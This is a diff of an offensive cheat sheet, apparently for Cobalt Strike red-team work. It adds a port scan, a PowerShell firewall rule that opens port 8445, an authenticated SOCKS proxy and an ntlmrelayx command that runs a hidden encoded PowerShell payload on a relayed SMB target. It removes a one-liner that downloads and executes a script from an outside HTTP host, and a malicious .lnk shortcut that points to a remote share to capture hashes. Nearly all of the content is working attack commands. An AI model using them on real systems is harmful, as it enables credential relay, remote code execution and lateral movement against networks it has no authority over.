@@ -39,6 +39,11 @@ screenwatch               Take periodic screenshots of desktop
 keylogger
 ```
 
+#### Portscan
+```
+portscan <CIDR> 139,445,3389,5985 none 1024
+```
+
 ### Webserver
 #### Upload file
 - Go to Site Management -> Host File and select your document.
@@ -607,15 +612,19 @@ PortBender redirect 445 8445
 rportfwd 8445 127.0.0.1 445
 ```
 
+#### Allow 8445 firewall
+```
+powershell New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8445
+```
+
 #### Create sockx proxy
 ```
-socks 1080
+socks 1080 socks5 disableNoAuth socks_user socks_password
 ```
 
 #### NTLMRelay execute command
 ```
-proxychains python3 /usr/local/bin/ntlmrelayx.py -t smb://10.10.17.68 -smb2support --no-http-server --no-wcf-server -c
-'powershell -nop -w hidden -c "iex (new-object net.webclient).downloadstring(\"http://10.10.17.231:8080/b\")"'
+sudo proxychains ntlmrelayx.py -t smb://<TARGET IP> -smb2support --no-http-server --no-wcf-server -c 'powershell -nop -w hidden -enc <PAYLOAD>'
 ```
 
 #### Stop portbender
@@ -624,20 +633,7 @@ jobs
 jobkill <JID>
 kill <PID>
 ```
-
-#### Create link file
-```
-$wsh = new-object -ComObject wscript.shell
-$shortcut = $wsh.CreateShortcut("\\<IP>\test.lnk")
-$shortcut.IconLocation = "\\<IP>\test.ico"
-$shortcut.Save()
-```
-
-#### Portscan
-```
-portscan <CIDR> 139,445,3389,5985 none 1024
-```
-    
+ 
 ## Evasion
 ### Malleable C2 profile
 - Example: https://github.com/Cobalt-Strike/Malleable-C2-Profiles
